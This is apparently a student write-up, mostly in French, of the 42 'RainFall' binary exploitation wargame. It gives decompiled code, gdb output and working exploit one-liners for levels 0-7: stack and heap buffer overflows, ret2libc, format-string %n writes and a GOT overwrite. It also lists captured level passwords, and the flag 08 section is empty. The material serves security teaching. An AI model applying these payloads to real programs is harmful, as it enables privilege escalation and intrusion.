# RainFall
RainFall project from 42

# Flag 0

if (iVar1 == 0x1a7)

0x1a7 = 423

./level0 423

## flag : 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

# Flag 1
export PATH=/tmp/Python-3.6.15:$PATH

void main(void)

{
  char local_50 [76];
  
  gets(local_50);
  return;
}

76 * "A" puis chunk de 4 lettres pour reperer ou est le degfault

./level1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
Segmentation fault (core dumped)

dmesg | grep segfault
[ 2079.333489] level1[6202]: segfault at 42424242 ip 42424242 sp bffffc90 error 4

42 = B

gdb ./level1
(gdb) info functions
(gdb) p run

$1 = {<text variable, no debug info>} 0x8048444 <run>

(python -c "print 'A'*76 + '\x44\x84\x04\x08'"; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77


## flag : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

# flag 02

ret2libc to bypass the return address overwrite protection

gdb
b main
r
p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
info proc -> adresse libc = 0xb7e2c000
find 0xb7e2c000, +99999999, "/bin/sh" -> trouve la string /bin/sh dans la libc pour l'utiliser avec system
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
x/s 0xb7f8cc58
0xb7f8cc58:      "/bin/sh"

(python3 exploit.py; cat) | ./level2

## flag : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

# flag 03
export VALGRIND_LIB=/tmp/valgrind_local/libexec/valgrind
/tmp/valgrind_local/bin/valgrind


void v(void)

{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}

addresse de m à controler : 0x804988c

0x40 = 64 en décimal

on a remarqué que nous pouvions faire une format string attack avec printf
et en essayant avec %x pour afficher les valeurs de la stack 4 byte par 4 byte:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA %x %x %x %x %x

nous trouvons le résultat suivant :

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 200 2e0ac0 1257d0 41414141 41414141

on peut ensuite utiliser l'argument %n qui écrit le nombre de caractères formatés dans l'argument passé à printf

cependant comme nous ne contrôlons pas les arguments de la fonction printf nous pouvons utiliser le fait que le 4ème élément de la stack est égal à au début de notre buffer pour faire écrire à printf sur l'adresse de m (avec %4$n qui écrit directement sur le 4ème argument de la stack) et ainsi faire en sorte que m soit égal à 64 (0x40) (nombre de caractères imprimés) pour déclencher le system("/bin/sh")

(python -c 'print("\x8c\x98\x04\x08" + (" " * 60) + "%4$n")'; cat) | ./level3

## flag : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

# flag 04

address of m : 0x08049810
valeur visée de m : 0x01025544

./level4
AAAA %x %x %x %x %x %x %x %x %x %x %x %x
AAAA 1246b0 bffffcb4 2dfff4 0 0 bffffc78 804848d bffffa70 200 2e0ac0 1257d0 41414141

le payload commence à la position 12 de la stack
en divisant l'écriture de m en deux (0x0102 et 0x5544) on peut faire deux écritures de 2 bytes chacune avec %hn pour écrire sur l'adresse de m

le payload commence donc par les adresses de m (0x08049810 et 0x08049812)
suivi de l'éciture de 0x5544 (21828) - 8 pour les 4 * 2 bytes des adresses charactères avec le format %21820x
écrites à la première adresse de m (0x08049810) avec %12$hn
par la suite pour écrire 0x0102 nous devons augmenter le compteur de charactère de printf pour faire en sorte que les 4 derniers bytes du compteur
reviennent à 0 ("overflow" 4 bytes)
pour ce faire il nous suffit d'imprimer 43966 charactères (65535 (0xffff) +1 (overflow 4 bytes) - 21828 (0x5544) + 258 (0x102)) avec le format %43966x
et d'écrire cette valeur à la deuxième adresse de m (0x08049812) avec %13$hn

(python exploit.py; cat) | ./level4

## flag : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

# flag 05

(gdb) b n
Breakpoint 1 at 0x80484cb
(gdb) r
Starting program: /home/user/level5/level5

Breakpoint 1, 0x080484cb in n ()
(gdb) disassemble
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
=> 0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disassemble 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:       0x080483d6


## flag : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

# flag 06

addresse de n (target function) : 0x08048454

void main(undefined4 param_1,int param_2)

{
  char *__dest;
  undefined4 *puVar1;
  
  __dest = malloc(0x40);
  puVar1 = malloc(4);
  *puVar1 = m;
  strcpy(__dest,*(char **)(param_2 + 4));
  (*(code *)*puVar1)();
  return;
}

./level6 $(python -c 'print(("A" * 72) + "\x54\x84\x04\x08")') 1

A * 64 remplit les données de _dest
A * 8 remplit le chunk header du malloc de puVar1
l'addresse de n (0x08048454) est écrite dans puVar1
quand le pointeur de fonction (*(code *)*puVar1)() est appelé, il exécute la fonction n

## flag : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

# flag 07

undefined4 main(undefined4 param_1,int param_2)

{
  undefined4 *puVar1;
  void *pvVar2;
  undefined4 *puVar3;
  FILE *__stream;
  
  puVar1 = malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;
  puVar3 = malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;
  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
  __stream = fopen("/home/user/level8/.pass","r");
  fgets(c,0x44,__stream);
  puts("~~");
  return 0;
}


during execution the heap looks like this :
0000 0x10 [var 1]
0000 0x10 [first malloc of var 2]
0000 0x10 [var 3]
0000 0x10 [var 2]

the first strcpy writes in puVar1[1] which points to the firstly allocated malloc of pvVar2
the second strcpy writes in puVar3[1] which points to the actual value of pvVar2

although by doing a buffer overflow we can overwrite a string until it reaches puVar3[1]
by doing so we overwrite the malloc chunk header of puVar3 although it doesn't matter because the header is not used again afterwards
(no malloc or free calls)

payload of first arg is:
padding : A * 20 (from first pvVar2 alloc it requires 8 bytes (data section) + 8 bytes (puVar3 chunk header) + 4 bytes (puVar3[0]) = 20)
address of the GOT of puts : 0x08049928

payload of second arg is:
address of the m function we need to call to print the flag : 0x080484f4

./level7 $(python -c 'print(("A" * 20) + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')

## flag : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

# flag 08


